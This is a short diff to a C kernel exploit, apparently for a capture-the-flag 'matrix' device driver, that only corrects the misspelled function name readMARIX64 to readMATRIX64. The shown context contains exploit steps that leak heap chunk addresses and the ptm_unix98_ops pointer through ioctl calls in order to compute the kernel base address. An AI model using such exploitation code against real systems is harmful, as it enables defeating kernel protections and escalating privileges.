@@ -88,7 +88,7 @@ int setname(int devfd,char* name){
     return ioctl(devfd,IOCTL_MATRIX_SET_NAME,name);
 }
 
-void readMARIX64(int devfd, uint64_t* need, off64_t offset){
+void readMATRIX64(int devfd, uint64_t* need, off64_t offset){
     struct matrix_pos leaker = {0};
     leaker.col = 0;
     for(uint32_t i = 0 ; i < 8;  ++i ){
@@ -123,7 +123,7 @@ int main(int argc,char** argv,char** envp){
         errExit("Set info fd1");
     logInfo("Set fd1 info: done.");
     //Leaking
-    readMARIX64(fd1,&chunk_addr1,0x38);
+    readMATRIX64(fd1,&chunk_addr1,0x38);
     chunk_addr1 -= 0x38;
     logInfo("Chunk1 @ %p",(void *)chunk_addr1);
 
@@ -149,8 +149,8 @@ int main(int argc,char** argv,char** envp){
     //Leaking
     uint64_t ptm_unix98_ops = 0;
     uint64_t chunk_addr2 = 0;
-    readMARIX64(fd2,&ptm_unix98_ops,0x18);
-    readMARIX64(fd2,&chunk_addr2,0x38);
+    readMATRIX64(fd2,&ptm_unix98_ops,0x18);
+    readMATRIX64(fd2,&chunk_addr2,0x38);
     chunk_addr2 -= 0x38;
     logInfo("ptm_unix98_ops = %p",(void *)ptm_unix98_ops);
     logInfo("Chunk2 @ %p",(void *)chunk_addr2);
@@ -197,7 +197,7 @@ int main(int argc,char** argv,char** envp){
     if(set_info(fd3,&info3))
         errExit("set_info 3");
     uint64_t chunk_addr3 = 0;
-    readMARIX64(fd3,&chunk_addr3,0x38);
+    readMATRIX64(fd3,&chunk_addr3,0x38);
     chunk_addr3 -= 0x38;
     logInfo("Chunk3 @ %p",(void *)chunk_addr3);
     uint64_t _text = ptm_unix98_ops - 0x82fb40;
